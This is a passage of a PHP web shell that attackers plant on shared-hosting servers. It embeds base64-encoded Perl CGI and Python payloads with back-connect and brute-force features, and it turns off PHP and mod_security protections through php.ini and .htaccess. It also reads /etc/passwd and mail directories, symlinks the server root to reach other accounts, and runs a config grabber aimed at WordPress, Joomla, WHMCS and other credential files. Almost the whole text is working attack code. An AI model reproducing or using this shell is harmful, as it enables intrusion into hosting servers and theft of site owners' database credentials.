Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoNCglwcmludCAmVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0DQp7DQoJJlByaW50UGFnZUhlYWRlcigiY2xpZW50cG9ydCIpOw0KCXByaW50ICZCYWNrQmluZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, base64_decode($cgi_script));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<iframe src='brudul_cgi/cgi.brudul' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
}elseif($_GET['symlink'] == 'python') {
	$sym_dir = mkdir('brudul_sympy', 0755);
        chdir('brudul_sympy');
	$file_sym = "sym.py";
	$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
        $sym = fopen($file_sym, "w");
	fwrite($sym, base64_decode($sym_script));
	chmod($file_sym, 0755);
        $jancok = exe("python sym.py");
        echo "<div id='menu'><center><a href='?dir=$dir&symlink=server'>Symlink Server</a><a href='?dir=$dir&symlink=404'>Symlink 404</a><a href='?dir=$dir&symlink=python'>Bypass Symlink Python</a></div>";
	echo "<br><center>Done ... <a href='brudul_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
} elseif($_GET['bypass'] == 'disablefunc'){
                echo "<div id='menu'><center><a href='?dir=$dir&bypass=disablefunc'>Disable Functions</a><a href='?dir=$dir&bypass=passwd'>Bypass /etc/passwd</a><a href='?dir=$dir&bypass=vhosts'>Bypass Vhosts</a></div>";
		echo "<br><br><center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' />&nbsp;<input type=submit name=litini value='Litespeed' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}               if(isset($_POST['litini'])){
		$iniph = '<? n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["file"]); n ini_restore("safe_mode"); n ini_restore("open_basedir"); n echo ini_get("safe_mode"); n echo ini_get("open_basedir"); n include($_GET["ss"]; n ?>';
			 $byph = "safe_mode = Off n disable_functions= ";
		$comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
		echo"</center>";
}
}elseif($_GET['bypass'] == 'tool'){
echo "<div id='menu'><center>";
echo "<a href='?dir=$dir&bypass=disablefunc'>Disable Functions</a><a href='?dir=$dir&bypass=passwd'>Bypass /etc/passwd</a><a href='?dir=$dir&bypass=vhosts'>Bypass Vhosts</a></div>";
}elseif($_GET['jancok'] == 'logout') {
	

echo '<form action="?dir=$dir&jancok=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Good Bye!!';
} elseif($_GET['symlink'] == 'tool'){
echo "<div id='menu'><center>";
echo "<a href='?dir=$dir&symlink=server'>Symlink Server</a><a href='?dir=$dir&symlink=404'>Symlink 404</a><a href='?dir=$dir&symlink=python'>Bypass Symlink Python</a></div>";
} elseif ($_GET['symlink'] == '404'){
@error_reporting(0);
@ini_set('display_errors', 0); 
echo "<div id='menu'><center><a href='?dir=$dir&symlink=server'>Symlink Server</a><a href='?dir=$dir&symlink=404'>Symlink 404</a><a href='?dir=$dir&symlink=python'>Bypass Symlink Python</a></div>";
echo '<center><b><a href="https://www.facebook.com/rinto2234">Coded By Con7ext</a></b><br>
<form method="post"><br>File Target : <input name="dir" value="/home/user/public_html/wp-config.php">
<br>
<br>Save As: <input name="jnck" value="ojayakan.txt"><input name="ojaykan" type="submit" value="Eksekusi Gan"></form><br>';
if($_POST['ojaykan']){
rmdir("brudul_symlink404");mkdir("brudul_symlink404", 0777);
$dir = $_POST['dir'];
$jnck = $_POST['jnck'];
system("ln -s ".$dir." brudul_symlink404/".$jnck);
symlink($dir,"brudul_symlink404/".$jnck);
$inija = fopen("brudul_symlink404/.htaccess", "w");
fwrite($inija,"ReadmeName ".$jnck."
Options Indexes FollowSymLinks
DirectoryIndex ngeue.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
");
echo'<a href="brudul_symlink404/" target="_blank">Klik Gan >:(</a>';
}
}elseif($_GET['bypass'] == 'passwd') {
        echo '<div id="menu"><center><a href="?dir=$dir&bypass=disablefunc">Disable Functions</a><a href="?dir=$dir&bypass=passwd">Bypass /etc/passwd</a><a href="?dir=$dir&bypass=vhosts">Bypass Vhosts</a></div>';
	echo '<br><br><center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif($_GET['kill'] == 'self') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
}
elseif($_GET['symlink'] == 'server') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("brudul_sym",0777);
@chdir("brudul_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<div id='menu'><center><a href='?dir=$dir&symlink=server'>Symlink Server</a><a href='?dir=$dir&symlink=404'>Symlink 404</a><a href='?dir=$dir&symlink=python'>Bypass Symlink Python</a></div>";
echo "<br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/brudul_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("brudul_sym",0777);
@chdir("brudul_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/brudul_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("brudul_sym",0777);@chdir("brudul_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/brudul_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
} elseif($_GET['config'] == 'grabber') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("brudul_symvhosts", 0777);
exe("ln -s / brudul_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("brudul_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php brudul_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php brudul_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php brudul_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php brudul_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php brudul_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php brudul_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml brudul_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php brudul_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php brudul_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("brudul_symconfig", 0777);
@symlink("/","brudul_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("brudul_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("brudul_sym404", 0777);
@symlink("/","brudul_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex brudul.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=* 
AddIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' ^^DIRECTORY^^
DefaultIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*brudul_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("brudul_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("brudul_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("brudul_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_brudul) {
$grab_config = array(
"/home/$user_brudul/.accesshash" => "WHM-accesshash",
"/home/$user_brudul/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_brudul/public_html/forum/config.php" => "phpBB",
"/home/$user_brudul/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_brudul/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_brudul/public_html/app/etc/local.xml" => "Magento",
"/home/$user_brudul/public_html/admin/config.php" => "OpenCart",
"/home/$user_brudul/public_html/application/config/database.php" => "Ellislab",
"/home/$user_brudul/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_brudul/public_html/inc/config.php" => "MyBB",
"/home/$user_brudul/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_brudul/public_html/inc/conf_global.php" => "IPB",
"/home/$user_brudul/public_html/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_brudul/public_html/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/blog/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/submitticket.php" => "^WHMCS",
"/home/$user_brudul/public_html/cms/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/beta/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/portal/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/site/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/main/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/home/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/demo/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/test/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/v1/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/v2/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/new/configuration.php" => "Joomla",
"/home/$user_brudul/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_brudul/public_html/Whmc/submitticket.php" => "WHMCS",
